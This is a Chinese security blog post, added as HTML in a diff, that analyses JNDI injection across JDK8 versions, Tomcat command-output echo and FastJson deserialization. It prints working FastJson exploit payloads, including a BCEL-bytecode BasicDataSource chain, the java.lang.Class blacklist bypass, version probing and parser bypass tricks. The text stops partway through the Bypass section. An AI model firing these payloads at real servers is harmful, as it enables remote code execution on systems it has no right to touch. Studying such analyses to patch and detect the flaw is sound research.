@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="JNDI注入以JDK8示例, JDK8u121以下的版本可以通过RMI协议加载远程恶意类, 121以后的版本则无法通过RMI协议进行远程加载, 原因如下：  示例代码 123456public class Client &amp;#123;    public static void main(String[] args) &amp;#123;        Context ctx &#x3D; new InitialCo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson与Tomcat回显">
+<meta property="og:url" content="http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/index.html">
+<meta property="og:site_name" content="Search is Null">
+<meta property="og:description" content="JNDI注入以JDK8示例, JDK8u121以下的版本可以通过RMI协议加载远程恶意类, 121以后的版本则无法通过RMI协议进行远程加载, 原因如下：  示例代码 123456public class Client &amp;#123;    public static void main(String[] args) &amp;#123;        Context ctx &#x3D; new InitialCo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gseatignrjj311q03cgol.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsj5uhsnfvj31ny0aoq50.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gseboacd6dj31p30u0hdt.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsec8vrmv6j325w0sq4jr.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gseca5k8y8j31s00sg1kx.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grhmnbqoyhj315g0kcgr0.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsgfv9tjtbj30zk0hqwht.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsehh65aa8j31fm0u0e81.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gseho13cmlj31ze0u01kx.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsf5m5x1fxj31m60u0gsw.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsir3lkqkoj30wn0u0gtp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gsj5v2pw8nj31r30u0dli.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfajzoiygj311b0u0wz4.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfct9enfoj31sd0u0e79.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfcvtfdztj31eb0u0atz.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gsj5vc4bbjj31xo04kq49.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfel9c2w9j325k05ugod.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfeb0t9xlj325i0qyarm.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfgshkc45j31u00m2thn.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfi7zc4r2j31oz0u0e06.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfij61zf2j31dz0u0h3s.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfihp3v3ij325k0awn3a.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfik6e6ujj31m50u0dz4.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsgwox9680j326u0d2aoa.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gshf9vj9b0j31n40u0b29.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gshpm3fy01j31qw03omy0.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfpiigqphj31rg0u0e81.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsfpkmlng4j31lk0u0wte.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsi29sby64j31d10u0jtt.jpg">
+<meta property="og:image" content="http://searchnull-image.oss-cn-shenzhen.aliyuncs.com/2021-07-21-094124.png">
+<meta property="article:published_time" content="2021-07-23T08:35:21.000Z">
+<meta property="article:modified_time" content="2021-07-23T08:36:01.405Z">
+<meta property="article:author" content="Search?&#x3D;Null">
+<meta property="article:tag" content="FastJson">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gseatignrjj311q03cgol.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>FastJson与Tomcat回显</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Search is Null" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/06/25/OpenSNS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&text=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&is_video=false&description=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FastJson与Tomcat回显&body=Check out this article: http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&name=FastJson与Tomcat回显&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&t=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI注入"><span class="toc-number">1.</span> <span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#高版本JDK"><span class="toc-number">1.1.</span> <span class="toc-text">高版本JDK</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat回显"><span class="toc-number">2.</span> <span class="toc-text">Tomcat回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson"><span class="toc-number">3.</span> <span class="toc-text">FastJson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-lt-1-2-48"><span class="toc-number">3.1.</span> <span class="toc-text">FastJson &lt; 1.2.48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三者结合"><span class="toc-number">3.2.</span> <span class="toc-text">三者结合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.3.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BasicDataSource"><span class="toc-number">3.4.</span> <span class="toc-text">BasicDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#版本探测"><span class="toc-number">3.5.</span> <span class="toc-text">版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">3.6.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁分析"><span class="toc-number">3.7.</span> <span class="toc-text">补丁分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-41"><span class="toc-number">3.7.1.</span> <span class="toc-text">1.2.41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-42"><span class="toc-number">3.7.2.</span> <span class="toc-text">1.2.42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-48"><span class="toc-number">3.7.3.</span> <span class="toc-text">1.2.48</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#蓝凌OA"><span class="toc-number">4.</span> <span class="toc-text">蓝凌OA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用友NC"><span class="toc-number">5.</span> <span class="toc-text">用友NC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#致远OA"><span class="toc-number">6.</span> <span class="toc-text">致远OA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#海康威视"><span class="toc-number">7.</span> <span class="toc-text">海康威视</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        FastJson与Tomcat回显
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Search is Null</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-23T08:35:21.000Z" itemprop="datePublished">2021-07-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/FastJson/" rel="tag">FastJson</a>, <a class="tag-link" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>以JDK8示例, JDK8u121以下的版本可以通过RMI协议加载远程恶意类, 121以后的版本则无法通过RMI协议进行远程加载, 原因如下：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gseatignrjj311q03cgol.jpg" alt="image-20210712173410195"></p>
+<p>示例代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(<span class="string">"rmi://127.0.0.1:1099/Test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>com.sun.jndi.rmi.registry.RegistryContext</strong>类的静态代码块中会获取<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性的值, 如果没有该属性的值则为默认值<code>false</code>, 所以此处的<code>trustURLCodebase</code>字段为false。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsj5uhsnfvj31ny0aoq50.jpg" alt="image-20210712174042062"></p>
+<p>在<strong>RegistryContext#decodeObject</strong>方法中354行处如果<code>trustURLCodebase</code>为false的话抛出异常</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gseboacd6dj31p30u0hdt.jpg" alt="image-20210712180347077"></p>
+<p>对应调用栈</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;decodeObject:493, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">&gt;lookup:138, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">&gt;lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">&gt;lookup:417, InitialContext (javax.naming)</span><br><span class="line">&gt;main:18, Client (JNDI)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>而JDK8小于181的版本则可以通过LDAP协议加载远程类, 之后的版本则无法加载远程类, 原理同上, 以我本地的JDK8u131演示, 无法通过RMI协议加载远程类, 但小于181可以通过LDAP加载远程类。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsec8vrmv6j325w0sq4jr.jpg" alt="image-20210712182334528"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gseca5k8y8j31s00sg1kx.jpg" alt="image-20210712182443198"></p>
+<h3 id="高版本JDK"><a href="#高版本JDK" class="headerlink" title="高版本JDK"></a>高版本JDK</h3><p>当客户端调用<code>lookup</code>方法执行远程调用时, 会经过<strong>RegistryContext#decodeObject</strong>方法, 在获取到服务端返回的<code>factoryName</code>后其优先通过本地<code>classpath</code>加载, 当本地加载失败时才会从<code>codebase</code>加载。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grhmnbqoyhj315g0kcgr0.jpg" alt=""></p>
+<p>对应调用栈</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)</span><br><span class="line">&gt;getObjectInstance:319, NamingManager (javax.naming.spi)</span><br><span class="line">&gt;decodeObject:464, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">&gt;lookup:124, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">&gt;lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">&gt;lookup:417, InitialContext (javax.naming)</span><br><span class="line">&gt;main:12, Client (org.vulhub.jndi)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>在<code>helper.loadClass</code>方法中其通过<code>Class.forName</code>获取类的Class, 并且在上图的163行处会调用<code>newInstance</code>方法, 这两步能够触发<code>静态代码块</code>与<code>无参构造器</code>。在回到<strong>NamingManager#getObjectInstance</strong>后会调用返回对象的<code>getObjectInstance</code>方法（该对象必须实现ObjectFactrory接口）, 当某个类的<code>getObjectInstance</code>方法存在危险操作且实现了ObjectFactory接口, 便无需通过远程加载类的利用方式。</p>
+<p>这里以本地的环境编写<code>Payload</code>类并实现<code>ObjectFactory</code>接口, 在<code>getObjectInstance</code>方法中执行命令, 当远程调用时本地的<code>classpath</code>存在这个类则会从本地加载后调用其<code>getObjectInstance</code>方法触发。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgfv9tjtbj30zk0hqwht.jpg" alt=""></p>
+<h2 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h2><p>在诸如反序列化或无回显的RCE漏洞利用中, 无法获得命令执行结果往往不利用下一步的渗透工作, 由于不可控因素居多无法判断导致命令执行失败的原因, 因此需要通过某种<code>方法</code>让其能够回显。</p>
+<ul>
+<li>通过线程组获取所有线程</li>
+<li>循环所有线程, 跳过线程名包含<code>exec</code>或不包含<code>http</code>的线程, 跳过非<code>Runnable</code>的实例的线程</li>
+<li>多重反射获取<code>request</code>对象</li>
+<li>通过<code>request</code>对象<code>getResponse</code>方法获取<code>response</code>对象</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsehh65aa8j31fm0u0e81.jpg" alt="image-20210712212431925"></p>
+<p>上图中多层反射的意思为经过多次反射字段获取最终得到<code>Request</code>对象, 简单缩写如下形式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.<span class="keyword">this</span>$<span class="number">0</span>.handler.global.processors.get(<span class="number">1</span>).req</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gseho13cmlj31ze0u01kx.jpg" alt="image-20210712213105151"></p>
+<p>通过上述的JNDI Client的代码演示加载远程恶意类执行命令并回显:</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsf5m5x1fxj31m60u0gsw.jpg" alt="image-20210713111942870"></p>
+<h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="FastJson-lt-1-2-48"><a href="#FastJson-lt-1-2-48" class="headerlink" title="FastJson &lt; 1.2.48"></a>FastJson &lt; 1.2.48</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述Payload适用于FastJson &lt; 1.2.48的所有版本, 当FastJson反序列化时如果<code>@type</code>指定的类存在于<code>ParserConfig</code>类的deserialize属性中, <code>Class</code>类对应的是<code>MiscCodec</code>对象。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsir3lkqkoj30wn0u0gtp.jpg" alt=""></p>
+<p>反序列化时会调用该对象的<code>deserialze</code>方法, 而<strong>MiscCodec#deserialze</strong>中会判断<code>@type</code>的类型如果是<code>java.lang.Class</code>的话会获取<code>val</code>键的值为类名调用<strong>TypeUtils#loadClass</strong>方法加载。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gsj5v2pw8nj31r30u0dli.jpg" alt="image-20210716140447449"></p>
+<p>通过这种「白 + 黑」的方式就能够将黑名单的类加入<code>mappings</code>缓存类中, 当加载时直接从<code>mappings</code>获取到该类直接返回, 不会经过黑名单的检查, 且无需开启<code>autoType</code>功能。</p>
+<h3 id="三者结合"><a href="#三者结合" class="headerlink" title="三者结合"></a>三者结合</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfajzoiygj311b0u0wz4.jpg" alt="image-20210713141015064"></p>
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><ul>
+<li>开启序列化私有字段功能（此Feature默认不开启, 需自行配置）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes\&quot;:[&quot;base64 bytecode...&quot;],&quot;_name&quot;:&quot;a&quot;,&quot;_tfactory&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><ul>
+<li>需<code>JSON.parseObject</code>才能够触发此gadget, 原因在于parseObject会调用所有getter方法, parse方法只会调用特定的getter方法, 此gadget在<code>BasicDataSource#getConnection</code>中触发。</li>
+<li>小于1.2.48的版本都可以使用 <code>java.lang.Class</code>白名单 ➕ BasicDataSource组合链。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;@type&#39;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">    &#39;driverClassLoader&#39;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#39;@type&#39;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;driverClassName&#39;:&#39;$$BCEL$$$l$8b...$A$A&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下述Payload执行完毕后会弹出Mac的计算器, 如Windows环境自行编写恶意类在静态代码块中添加执行命令的的代码, 并转成BCEL格式的字节码替换。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;&#125;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b8$b1c$iB$C$a1$b4$f4$83o$C$H$7c$e1$GB$aa$Q$5c$ea$96$aaA$f4$bcYVa$c1$b1$z$7b$83$e0$Xq$e6$C$88$D$3f$80$l$85$98$dd$f2$r$95$95v$c6$f3$de$cc$9b$99$f5$fd$c3$ed$j$80u$y$f9$f0$f0$c1$c7$U$3ez$f8d$fc$b4$8b$cf$3e$w$f8$e2$e2$ab$8bo$M$d5M$95$u$bd$c5P$ee$ac$i08$db$e9$a1dhD$w$91$bf$86$83$9e$cc$f7y$_$s$a4$V$a5$82$c7$H$3cW$s$7e$C$j$7d$a4$K$d2$88vNU$bc$c1$e0m$8a$f8I$8e$R$dd$8e$8e$f9$v$Pc$9e$f4$c3$9d3$n3$ad$d2$84$d2$ea$5d$cd$c5$c9O$9eY$Z$9a$88$c1$ef$a6$c3$5c$c8$5dedkFn$cd$d4$G$a8$c1w1$T$60$Ws$M$9d4$93$c9L$d8$3d$_$b4$i$84$df$b3$yV$82$h$d1$o$dc$e6$b1$Y$c6$5c$a7$f9$g$cf$b2$A$f3X$60$Y$7f$a7$7f$80E$f84$ba$e9$c10$f6$9a$b1$d7$3b$96B34_$a1$3f$c3D$ab$BM$e4$f7$a5$7e$J$da$9d$95$e8$bf$iZ$cb$91gR0$yw$de$b0$5d$9d$ab$a4$bf$f1$b6$e0w$9e$KY$UT$d0$c8$88$d4$f61$f6s$$$q$z$e9$d2$P3$a7$EfV$t$3bBQH$9e$91$af$ac$5e$83$5dZ$3a$m$5b$b5$m$bd$t$d9$e0_$CF$d1$m$efa$ec$a5$98$5b1$a0u$83R$ab$7c$F$e7$ef$F$bc$l$abW$a8$5eZ$bcF$b5$V$94$ad$e2$q$7d$B$Oa$aeE$eb$d4$a3Ij$cf$j$ea$c45$d1$a2h$9c$ae$8bR$e4b$c2$n$a2m$87$9a$7c$E$a7NJ$jz$C$A$A&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h3><blockquote>
+<p>{“@type”:”java.lang.AutoCloseable”</p>
+<p>[“a”:1]</p>
+</blockquote>
+<p>不同版本之间略有差别, 可使用多种Payload尝试</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfct9enfoj31sd0u0e79.jpg" alt="image-20210713152843613"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfcvtfdztj31eb0u0atz.jpg" alt="image-20210713153109685"></p>
+<p>原理在于<code>{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;</code>读取到最后一位时<code>this.ch</code>则为<code>\u001a</code>。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gsj5vc4bbjj31xo04kq49.jpg" alt="image-20210713162634572"></p>
+<p>调用<code>nextToken</code>方法时</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfel9c2w9j325k05ugod.jpg" alt="image-20210713163014378"></p>
+<p>最后在<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong>方法中抛出异常时带上了版本信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfeb0t9xlj325i0qyarm.jpg" alt="image-20210713162022801"></p>
+<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p><code>特殊字符</code>与<code>注释</code></p>
+<p>在<strong>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</strong>方法解析对象时会调用<strong>JSONLexerBase#skipWhitespace</strong>方法会跳过对空格、制表符、注释等的解析。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfgshkc45j31u00m2thn.jpg" alt="image-20210713174622488"></p>
+<p>因此如下形式的JSON也能够正常解析</p>
+<blockquote>
+<p>{\t\n”@type”:\t\n”org.vulhub.User”,”id”:”1”,\f\b”name”:”test”}</p>
